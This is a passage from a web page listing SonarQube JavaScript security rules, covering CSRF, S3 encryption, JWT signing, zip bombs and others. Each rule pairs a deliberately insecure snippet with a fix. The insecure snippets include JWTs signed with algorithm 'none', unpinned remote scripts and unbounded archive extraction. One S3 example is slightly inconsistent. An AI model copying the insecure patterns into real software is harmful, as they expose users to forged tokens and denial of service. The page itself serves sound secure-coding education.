let express &#61; require(&#39;express&#39;);

app.use(csrf({ cookie: true, ignoreMethods: [&#34;GET&#34;] })); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://cwe.mitre.org/data/definitions/352" rel="nofollow">MITRE, CWE-352</a> - Cross-Site Request Forgery (CSRF) </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://owasp.org/www-community/attacks/csrf" rel="nofollow">OWASP: Cross-Site Request Forgery</a> </li><li> <a href="https://www.sans.org/top25-software-errors/#cat1" rel="nofollow">SANS Top 25</a> - Insecure Interaction Between Components </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6245">
              javascript:S6245
            </a>
          </td>
          <td>
            <details>
              <p>Server-side encryption (SSE) encrypts an object (not the metadata) as it is written to disk (where the S3 bucket resides) and decrypts it as it is
read from disk. This doesn’t change the way the objects are accessed, as long as the user has the necessary permissions, objects are retrieved as if
they were unencrypted. Thus, SSE only helps in the event of disk thefts, improper disposals of disks and other attacks on the AWS infrastructure
itself.</p>
<p>There are three SSE options:</p>
<ul><li> Server-Side Encryption with Amazon S3-Managed Keys (SSE-S3)
    <ul><li> AWS manages encryption keys and the encryption itself (with AES-256) on its own. </li></ul>  </li><li> Server-Side Encryption with Customer Master Keys (CMKs) Stored in AWS Key Management Service (SSE-KMS)
    <ul><li> AWS manages the encryption (AES-256) of objects and encryption keys provided by the AWS KMS service. </li></ul>  </li><li> Server-Side Encryption with Customer-Provided Keys (SSE-C)
    <ul><li> AWS manages only the encryption (AES-256) of objects with encryption keys provided by the customer. AWS doesn’t store the customer’s
      encryption keys. </li></ul>  </li></ul>
<h2>Ask Yourself Whether</h2>
<ul><li> The S3 bucket stores sensitive information. </li><li> The infrastructure needs to comply to some regulations, like HIPAA or PCI DSS, and other standards. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to use SSE. Choosing the appropriate option depends on the level of control required for the management of encryption keys.</p>
<h2>Sensitive Code Example</h2>
<p>Server-side encryption is not used:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;default&#39;
}); // Sensitive
</pre>
<p>Bucket encryption is disabled by default.</p>
<h2>Compliant Solution</h2>
<p>Server-side encryption with Amazon S3-Managed Keys is used:</p>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    encryption: s3.BucketEncryption.KMS_MANAGED
});

# Alternatively with a KMS key managed by the user.

new s3.Bucket(this, &#39;id&#39;, {
    encryption: s3.BucketEncryption.KMS_MANAGED,
    encryptionKey: access_key
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/serv-side-encryption.html" rel="nofollow">AWS documentation</a> - Protecting data using
  server-side encryption </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BucketEncryption.html" rel="nofollow">AWS CDK version 2</a> - BucketEncryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S4507">
              javascript:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li><li> The application runs by default with debug features activated. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/errorhandler" rel="nofollow">errorhandler Express.js middleware</a> should not be used in production:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const errorhandler &#61; require(&#39;errorhandler&#39;);

let app &#61; express();
app.use(errorhandler()); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/errorhandler" rel="nofollow">errorhandler Express.js middleware</a> used only in development mode:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const errorhandler &#61; require(&#39;errorhandler&#39;);

let app &#61; express();

if (process.env.NODE_ENV &#61;&#61;&#61; &#39;development&#39;) {
  app.use(errorhandler());
}
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/489" rel="nofollow">MITRE, CWE-489</a> - Active Debug Code </li><li> <a href="https://cwe.mitre.org/data/definitions/215" rel="nofollow">MITRE, CWE-215</a> - Information Exposure Through Debug Information </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5604">
              javascript:S5604
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://www.w3.org/TR/permissions/#powerful-feature" rel="nofollow">Powerful features</a> are browser features (geolocation, camera, microphone …​) that
can be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user
security thus they should only be used if they are really necessary to implement the critical parts of an application.</p>
<p>This rule highlights intrusive permissions when requested with <a href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions/query" rel="nofollow">the
future standard (but currently experimental) web browser query API</a> and specific APIs related to the permission. It is highly recommended to
customize this rule with the permissions considered as intrusive in the context of the web application.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Some powerful features used by the application are not really necessary. </li><li> Users are not clearly informed why and when powerful features are used by the application. </li></ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> In order to respect user privacy it is recommended to avoid using intrusive powerful features. </li></ul>
<h2>Sensitive Code Example</h2>
<p>When using <a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API" rel="nofollow">geolocation API</a>, Firefox for example retrieves personal
information like nearby wireless access points and IP address and sends it to the default geolocation service provider, <a href="https://www.google.com/privacy/lsf.html" rel="nofollow">Google Location Services</a>:</p>
<pre>
navigator.permissions.query({name:&#34;geolocation&#34;}).then(function(result) {
});  // Sensitive: geolocation is a powerful feature with high privacy concerns

navigator.geolocation.getCurrentPosition(function(position) {
  console.log(&#34;coordinates x&#61;&#34;&#43;position.coords.latitude&#43;&#34; and y&#61;&#34;&#43;position.coords.longitude);
}); // Sensitive: geolocation is a powerful feature with high privacy concerns
</pre>
<h2>Compliant Solution</h2>
<p>If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when
possible:</p>
<pre>
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;
        Retailer website example
    &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    Type a city, street or zip code where you want to retrieve the closest retail locations of our products:
    &lt;form method&#61;post&gt;
        &lt;input type&#61;text value&#61;&#34;New York&#34;&gt; &lt;!-- Compliant --&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Web Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://cwe.mitre.org/data/definitions/250" rel="nofollow">MITRE, CWE-250</a> - Execution with Unnecessary Privileges </li><li> <a href="https://cwe.mitre.org/data/definitions/359" rel="nofollow">MITRE, CWE-359</a> - Exposure of Private Information </li><li> <a href="https://www.w3.org/TR/permissions/" rel="nofollow">W3C</a> - Permissions </li><li> <a href="https://support.mozilla.org/en-US/kb/does-firefox-share-my-location-websites" rel="nofollow">Mozilla</a> - Does Firefox share my location with
  websites? </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5725">
              javascript:S5725
            </a>
          </td>
          <td>
            <details>
              <p>Using remote artifacts without integrity checks can lead to the unexpected execution of malicious code in the application.</p>
<p>On the client side, where front-end code is executed, malicious code could:</p>
<ul><li> impersonate users&#39; identities and take advantage of their privileges on the application. </li><li> add quiet malware that monitors users&#39; session and capture sensitive secrets. </li><li> gain access to sensitive clients&#39; personal data. </li><li> deface, or otherwise affect the general availability of the application. </li><li> mine cryptocurrencies in the background. </li></ul>
<p>Likewise, a compromised software piece that would be deployed on a server-side application could badly affect the application’s security. For
example, server-side malware could:</p>
<ul><li> access and modify sensitive technical and business data. </li><li> elevate its privileges on the underlying operating system. </li><li> Use the compromised application as a pivot to attack the local network. </li></ul>
<p>By ensuring that a remote artifact is exactly what it is supposed to be before using it, the application is protected from unexpected changes
applied to it before it is downloaded.<br /> Especially, integrity checks will allow for identifying an artifact replaced by malware on the publication
website or that was legitimately changed by its author, in a more benign scenario.</p>
<p>Important note: downloading an artifact over HTTPS only protects it while in transit from one host to another. It provides authenticity and
integrity checks <strong>for the network stream</strong> only. It does not ensure the authenticity or security of the artifact itself.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The artifact is a file intended to execute code. </li><li> The artifact is a file that is intended to configure or affect running code in some way. </li></ul>
<p>There is a risk if you answered yes to any of these questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>To check the integrity of a remote artifact, hash verification is the most reliable solution. It does ensure that the file has not been modified
since the fingerprint was computed.</p>
<p>In this case, the artifact’s hash must:</p>
<ul><li> Be computed with a secure hash algorithm such as <code>SHA512</code>, <code>SHA384</code> or <code>SHA256</code>. </li><li> Be compared with a secure hash that was <strong>not</strong> downloaded from the same source. </li></ul>
<p>To do so, the best option is to add the hash in the code explicitly, by following <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity#tools_for_generating_sri_hashes" rel="nofollow">Mozilla’s official documentation on
how to generate integrity strings</a>.</p>
<p><strong>Note: Use this fix together with version binding on the remote file. Avoid downloading files named &#34;latest&#34; or similar, so that the
front-end pages do not break when the code of the latest remote artifact changes.</strong></p>
<h2>Sensitive Code Example</h2>
<p>The following code sample uses neither integrity checks nor version pinning:</p>
<pre>
let script &#61; document.createElement(&#34;script&#34;);
script.src &#61; &#34;https://cdn.example.com/latest/script.js&#34;; // Sensitive
script.crossOrigin &#61; &#34;anonymous&#34;;
document.head.appendChild(script);
</pre>
<h2>Compliant Solution</h2>
<pre>
let script &#61; document.createElement(&#34;script&#34;);
script.src &#61; &#34;https://cdn.example.com/v5.3.6/script.js&#34;;
script.integrity &#61; &#34;sha384-oqVuAfXRKap7fdgcCY5uykM6&#43;R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC&#34;;
script.crossOrigin &#61; &#34;anonymous&#34;;
document.head.appendChild(script);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/" rel="nofollow">OWASP Top 10 2021 Category A8</a> - Software and Data
  Integrity Failures </li><li> <a href="https://cwe.mitre.org/data/definitions/353" rel="nofollow">MITRE, CWE-353</a> - Missing Support for Integrity Check </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category
  A6</a> - Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity" rel="nofollow">developer.mozilla.org</a> - Subresource Integrity </li><li> <a href="https://en.wikipedia.org/wiki/Watering_hole_attack" rel="nofollow">Wikipedia, Watering Hole Attacks</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5728">
              javascript:S5728
            </a>
          </td>
          <td>
            <details>
              <p>Content security policy (CSP) (fetch directives) is a <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">W3C standard </a> which is used by a server to specify,
via a http header, the origins from where the browser is allowed to load resources. It can help to mitigate the risk of cross site scripting (XSS)
attacks and reduce privileges used by an application. If the website doesn’t define CSP header the browser will apply <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" rel="nofollow">same-origin policy</a> by default.</p>
<pre>
Content-Security-Policy: default-src &#39;self&#39;; script-src ‘self ‘ http://www.example.com
</pre>
<p>In the above example, all resources are allowed from the website where this header is set and script resources fetched from example.com are also
authorized:</p>
<pre>
&lt;img src&#61;&#34;selfhostedimage.png&gt;&lt;/script&gt; &lt;!-- will be loaded because default-src &#39;self&#39;; directive is applied  --&gt;
&lt;img src&#61;&#34;http://www.example.com/image.png&gt;&lt;/script&gt;  &lt;!-- will NOT be loaded because default-src &#39;self&#39;; directive is applied  --&gt;
&lt;script src&#61;&#34;http://www.example.com/library.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
&lt;script src&#61;&#34;selfhostedscript.js&gt;&lt;/script&gt; &lt;!-- will be loaded because script-src ‘self ‘ http://www.example.com directive is applied  --&gt;
&lt;script src&#61;&#34;http://www.otherexample.com/library.js&gt;&lt;/script&gt; &lt;!-- will NOT be loaded because script-src ‘self ‘ http://www.example.comdirective is applied  --&gt;
</pre>
<h2>Ask Yourself Whether</h2>
<ul><li> The resources of the application are fetched from various untrusted locations. </li></ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy fetch directives, in particular <em>default-src</em> directive and continue to properly sanitize and validate all
inputs of the application, indeed CSP fetch directives is only a tool to reduce the impact of cross site scripting attacks.</p>
<h2>Sensitive Code Example</h2>
<p>In a Express.js application, the code is sensitive if the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet</a> contentSecurityPolicy
middleware is disabled:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();
app.use(
    helmet({
      contentSecurityPolicy: false, // sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In a Express.js application, a standard way to implement CSP is the <a href="https://www.npmjs.com/package/helmet" rel="nofollow">helmet contentSecurityPolicy
middleware</a>:</p>
<pre>
const express &#61; require(&#39;express&#39;);
const helmet &#61; require(&#39;helmet&#39;);

let app &#61; express();
app.use(helmet.contentSecurityPolicy()); // Compliant
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://www.w3.org/TR/CSP3/" rel="nofollow">w3.org</a> - Content Security Policy Level 3 </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category
  A6</a> - Security Misconfiguration </li><li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" rel="nofollow">developer.mozilla.org</a> - Content Security Policy (CSP) </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5042">
              javascript:S5042
            </a>
          </td>
          <td>
            <details>
              <p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can
lead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of
uncompressed data. To achieve this extreme <a href="https://en.wikipedia.org/wiki/Data_compression_ratio" rel="nofollow">compression ratio</a>, attackers will
compress irrelevant data (eg: a long string of repeated bytes).</p>
<h2>Ask Yourself Whether</h2>
<p>Archives to expand are untrusted and:</p>
<ul><li> There is no validation of the number of entries in the archive. </li><li> There is no validation of the total size of the uncompressed data. </li><li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is
  1 to 3. </li><li> Define and control the threshold for maximum total size of the uncompressed data. </li><li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in
  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li></ul>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://github.com/npm/node-tar" rel="nofollow">tar</a> module:</p>
<pre>
const tar &#61; require(&#39;tar&#39;);

tar.x({ // Sensitive
  file: &#39;foo.tar.gz&#39;
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip" rel="nofollow">adm-zip</a> module:</p>
<pre>
const AdmZip &#61; require(&#39;adm-zip&#39;);

let zip &#61; new AdmZip(&#34;./foo.zip&#34;);
zip.extractAllTo(&#34;.&#34;); // Sensitive
</pre>
<p>For <a href="https://stuk.github.io/jszip/" rel="nofollow">jszip</a> module:</p>
<pre>
const fs &#61; require(&#34;fs&#34;);
const JSZip &#61; require(&#34;jszip&#34;);

fs.readFile(&#34;foo.zip&#34;, function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) { // Sensitive
    zip.forEach(function (relativePath, zipEntry) {
      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(zipEntry.name);
      } else {
        zip.file(zipEntry.name).async(&#39;nodebuffer&#39;).then(function (content) {
          fs.writeFileSync(zipEntry.name, content);
        });
      }
    });
  });
});
</pre>
<p>For <a href="https://github.com/thejoshwolfe/yauzl" rel="nofollow">yauzl</a> module</p>
<pre>
const yauzl &#61; require(&#39;yauzl&#39;);

yauzl.open(&#39;foo.zip&#39;, function (err, zipfile) {
  if (err) throw err;

  zipfile.on(&#34;entry&#34;, function(entry) {
    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>For <a href="https://github.com/maxogden/extract-zip" rel="nofollow">extract-zip</a> module:</p>
<pre>
const extract &#61; require(&#39;extract-zip&#39;)

async function main() {
  let target &#61; __dirname &#43; &#39;/test&#39;;
  await extract(&#39;test.zip&#39;, { dir: target }); // Sensitive
}
main();
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://github.com/npm/node-tar" rel="nofollow">tar</a> module:</p>
<pre>
const tar &#61; require(&#39;tar&#39;);
const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB

let fileCount &#61; 0;
let totalSize &#61; 0;

tar.x({
  file: &#39;foo.tar.gz&#39;,
  filter: (path, entry) &#61;&gt; {
    fileCount&#43;&#43;;
    if (fileCount &gt; MAX_FILES) {
      throw &#39;Reached max. number of files&#39;;
    }

    totalSize &#43;&#61; entry.size;
    if (totalSize &gt; MAX_SIZE) {
      throw &#39;Reached max. size&#39;;
    }

    return true;
  }
});
</pre>
<p>For <a href="https://github.com/cthackers/adm-zip" rel="nofollow">adm-zip</a> module:</p>
<pre>
const AdmZip &#61; require(&#39;adm-zip&#39;);
const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB
const THRESHOLD_RATIO &#61; 10;

let fileCount &#61; 0;
let totalSize &#61; 0;
let zip &#61; new AdmZip(&#34;./foo.zip&#34;);
let zipEntries &#61; zip.getEntries();
zipEntries.forEach(function(zipEntry) {
    fileCount&#43;&#43;;
    if (fileCount &gt; MAX_FILES) {
        throw &#39;Reached max. number of files&#39;;
    }

    let entrySize &#61; zipEntry.getData().length;
    totalSize &#43;&#61; entrySize;
    if (totalSize &gt; MAX_SIZE) {
        throw &#39;Reached max. size&#39;;
    }

    let compressionRatio &#61; entrySize / zipEntry.header.compressedSize;
    if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw &#39;Reached max. compression ratio&#39;;
    }

    if (!zipEntry.isDirectory) {
        zip.extractEntryTo(zipEntry.entryName, &#34;.&#34;);
    }
});
</pre>
<p>For <a href="https://stuk.github.io/jszip/" rel="nofollow">jszip</a> module:</p>
<pre>
const fs &#61; require(&#34;fs&#34;);
const pathmodule &#61; require(&#34;path&#34;);
const JSZip &#61; require(&#34;jszip&#34;);

const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB

let fileCount &#61; 0;
let totalSize &#61; 0;
let targetDirectory &#61; __dirname &#43; &#39;/archive_tmp&#39;;

fs.readFile(&#34;foo.zip&#34;, function(err, data) {
  if (err) throw err;
  JSZip.loadAsync(data).then(function (zip) {
    zip.forEach(function (relativePath, zipEntry) {
      fileCount&#43;&#43;;
      if (fileCount &gt; MAX_FILES) {
        throw &#39;Reached max. number of files&#39;;
      }

      // Prevent ZipSlip path traversal (S6096)
      const resolvedPath &#61; pathmodule.join(targetDirectory, zipEntry.name);
      if (!resolvedPath.startsWith(targetDirectory)) {
        throw &#39;Path traversal detected&#39;;
      }

      if (!zip.file(zipEntry.name)) {
        fs.mkdirSync(resolvedPath);
      } else {
        zip.file(zipEntry.name).async(&#39;nodebuffer&#39;).then(function (content) {
          totalSize &#43;&#61; content.length;
          if (totalSize &gt; MAX_SIZE) {
            throw &#39;Reached max. size&#39;;
          }

          fs.writeFileSync(resolvedPath, content);
        });
      }
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/thejoshwolfe/yauzl" rel="nofollow">yauzl</a> module</p>
<pre>
const yauzl &#61; require(&#39;yauzl&#39;);

const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB
const THRESHOLD_RATIO &#61; 10;

yauzl.open(&#39;foo.zip&#39;, function (err, zipfile) {
  if (err) throw err;

  let fileCount &#61; 0;
  let totalSize &#61; 0;

  zipfile.on(&#34;entry&#34;, function(entry) {
    fileCount&#43;&#43;;
    if (fileCount &gt; MAX_FILES) {
      throw &#39;Reached max. number of files&#39;;
    }

    // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
    // Alternatively, calculate the size from the readStream.
    let entrySize &#61; entry.uncompressedSize;
    totalSize &#43;&#61; entrySize;
    if (totalSize &gt; MAX_SIZE) {
      throw &#39;Reached max. size&#39;;
    }

    if (entry.compressedSize &gt; 0) {
      let compressionRatio &#61; entrySize / entry.compressedSize;
      if (compressionRatio &gt; THRESHOLD_RATIO) {
        throw &#39;Reached max. compression ratio&#39;;
      }
    }

    zipfile.openReadStream(entry, function(err, readStream) {
      if (err) throw err;
      // TODO: extract
    });
  });
});
</pre>
<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to
decide if the implementation is secure.</p>
<p>For <a href="https://github.com/maxogden/extract-zip" rel="nofollow">extract-zip</a> module:</p>
<pre>
const extract &#61; require(&#39;extract-zip&#39;)

const MAX_FILES &#61; 10000;
const MAX_SIZE &#61; 1000000000; // 1 GB
const THRESHOLD_RATIO &#61; 10;

async function main() {
  let fileCount &#61; 0;
  let totalSize &#61; 0;

  let target &#61; __dirname &#43; &#39;/foo&#39;;
  await extract(&#39;foo.zip&#39;, {
    dir: target,
    onEntry: function(entry, zipfile) {
      fileCount&#43;&#43;;
      if (fileCount &gt; MAX_FILES) {
        throw &#39;Reached max. number of files&#39;;
      }

      // The uncompressedSize comes from the zip headers, so it might not be trustworthy.
      // Alternatively, calculate the size from the readStream.
      let entrySize &#61; entry.uncompressedSize;
      totalSize &#43;&#61; entrySize;
      if (totalSize &gt; MAX_SIZE) {
        throw &#39;Reached max. size&#39;;
      }

      if (entry.compressedSize &gt; 0) {
        let compressionRatio &#61; entrySize / entry.compressedSize;
        if (compressionRatio &gt; THRESHOLD_RATIO) {
          throw &#39;Reached max. compression ratio&#39;;
        }
      }
    }
  });
}
main();
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> -
  Security Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/409" rel="nofollow">MITRE, CWE-409</a> - Improper Handling of Highly Compressed Data (Data Amplification)
  </li><li> <a href="https://www.bamsoftware.com/hacks/zipbomb/" rel="nofollow">bamsoftware.com</a> - A better Zip Bomb </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6252">
              javascript:S6252
            </a>
          </td>
          <td>
            <details>
              <p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3
bucket.</p>
<p>It can lead to unintentional or intentional information loss.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The bucket stores information that require high availability. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>
<h2>Sensitive Code Example</h2>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    versioned: false // Sensitive
});
</pre>
<p>The default value of <code>versioned</code> is <code>false</code> so the absence of this parameter is also sensitive.</p>
<h2>Compliant Solution</h2>
<pre>
const s3 &#61; require(&#39;aws-cdk-lib/aws-s3&#39;);

new s3.Bucket(this, &#39;id&#39;, {
    bucketName: &#39;bucket&#39;,
    versioned: true
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html" rel="nofollow">AWS documentation</a> - Using versioning in S3 buckets </li><li> <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned" rel="nofollow">AWS CDK version 2</a> - Using versioning in S3
  buckets </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5659">
              javascript:S5659
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability allows forging of JSON Web Tokens to impersonate other users.</p>
<h2>Why is this an issue?</h2>
<p>JSON Web Tokens (JWTs), a popular method of securely transmitting information between parties as a JSON object, can become a significant security
risk when they are not properly signed with a robust cipher algorithm, left unsigned altogether, or if the signature is not verified. This
vulnerability class allows malicious actors to craft fraudulent tokens, effectively impersonating user identities. In essence, the integrity of a JWT
hinges on the strength and presence of its signature.</p>
<h3>What is the potential impact?</h3>
<p>When a JSON Web Token is not appropriately signed with a strong cipher algorithm or if the signature is not verified, it becomes a significant
threat to data security and the privacy of user identities.</p>
<h4>Impersonation of users</h4>
<p>JWTs are commonly used to represent user authorization claims. They contain information about the user’s identity, user roles, and access rights.
When these tokens are not securely signed, it allows an attacker to forge them. In essence, a weak or missing signature gives an attacker the power to
craft a token that could impersonate any user. For instance, they could create a token for an administrator account, gaining access to high-level
permissions and sensitive data.</p>
<h4>Unauthorized data access</h4>
<p>When a JWT is not securely signed, it can be tampered with by an attacker, and the integrity of the data it carries cannot be trusted. An attacker
can manipulate the content of the token and grant themselves permissions they should not have, leading to unauthorized data access.</p>
<h2>How to fix it in jsonwebtoken</h2>
<h3>Code examples</h3>
<p>The following code contains examples of JWT encoding and decoding without a strong cipher algorithm.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.sign(payload, key, { algorithm: &#39;none&#39; }); // Noncompliant
</pre>
<pre data-diff-id="2" data-diff-type="noncompliant">
const jwt &#61; require(&#39;jsonwebtoken&#39;);

jwt.verify(token, key, {
    expiresIn: 360000,
